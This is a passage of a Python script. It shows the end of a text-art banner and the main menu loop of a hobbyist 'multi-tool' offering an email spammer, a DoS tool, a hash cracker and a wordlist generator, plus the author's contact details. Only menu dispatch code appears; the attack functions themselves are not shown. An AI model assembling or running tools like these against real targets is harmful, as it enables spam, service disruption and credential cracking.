⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"""

	c.print(main_md, style="regular")
	c.print(f"[regular]{main_art}")


def main_tool():
	while True:
		
		clear_screen()
		main_art()
		
		main = c.input("[regular]Choose Tool:\n[ [info]1[regular] ] Emails Spammer		[ [info]2[regular] ] DoS Tool		[ [info]3[regular] ] Sub-Paths Getter\n[ [info]4[regular] ] Hasher			[ [info]5[regular] ] Hash Killer	[ [info]6[regular] ] Wordlist Generator\n				[ [info]7[regular] ] Exit\nAnswer:	")
		
		clear_screen()

		if main == "1" or main.lower() == "emails spammer":
			while True:
				emails_runner()
				if not ask_again():
					break

		elif main == "2" or main.lower() == "dos tool":
			while True:
				dos_runner()
				if not ask_again():
					break

		elif main == "3" or main.lower() == "sub-domains getter":
			while True:
				sub_runner()
				if not ask_again():
					break

		elif main == "4" or main.lower() == "hasher":
			hasher_runner()

		elif main == "5" or main.lower() == "hash killer":
			while True:
				t = threading.Thread(target=run_hash_killer)
				t.start()
				t.join()
				if not ask_again():
					break

		elif main == "6" or main.lower() == "wordlist generator":
			while True:
				t = threading.Thread(target=do)
				t.start()
				t.join()
				if not ask_again():
					break

		elif main == "7" or main.lower() == "exit":
			clear_screen()
			main_art()
			
			c.print("[info]Thanks For Using Y2S's Multi-Tool\n\nTo Contact:\nWhatsApp:	[regular]+212 751-414252\n[info]Telegram:	[regular]@RDJ39")
			break

		else:
			c.print("Choose From 1 To 7 Only...", style="error")
			time.sleep(1.5)

main_tool()
